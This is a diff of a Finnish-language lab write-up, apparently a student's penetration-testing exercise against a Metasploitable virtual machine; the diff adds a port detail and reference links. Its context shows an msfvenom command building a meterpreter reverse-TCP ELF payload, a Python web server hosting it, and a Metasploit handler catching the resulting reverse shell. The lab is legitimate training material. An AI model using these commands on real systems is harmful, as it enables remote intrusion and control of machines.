@@ -215,7 +215,7 @@ Aloitetaan varmistamalla molempien koneiden ip osoitteet, sekä että koneet ova
 
 Ajetaan komento `msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.6 lport=5555 -f elf > reverse.elf` joka otettiin [msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom) cheat sheetistä. Komento luo haittatiedoston reverse.elf
 
-Sitten ajetaan komento `python3 -m http.server` joka laittaa webbiserverin käyntiin, joka sisältää juuri tehdyn haittaohjelman.
+Sitten ajetaan komento `python3 -m http.server` joka laittaa webbiserverin käyntiin porttiin 8000, joka sisältää juuri tehdyn haittaohjelman.
 
 Otetaan uusi terminaali-ikkuna ja mennään msfconsoleen. Käytetään siellä multi/handler exploittia. Ajetaan komento `use exploit/multi/handler`
 
@@ -259,3 +259,5 @@ Ja niin saatiin reverse shell yhteys metasploitableen.
 - ffuf.me, Target practice: http://ffuf.me/
 - CybrZone, Crack password protecte PDF documents with John The Ripper: https://www.youtube.com/watch?v=-AnQ2GAbFUY
 - G MAN: Security, CRACK the Password | JOHN the Ripper Password Cracking (5 Minutes) | Basic Tutorial: https://www.youtube.com/watch?v=5MLprTAxYDA&t=10s
+- CyberOffence, Use Msfvenom to Create a Reverse TCP Payload: https://www.youtube.com/watch?v=ZqWfDrD2WVY
+- Hacktricks, Msfvenom cheatsheet: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux
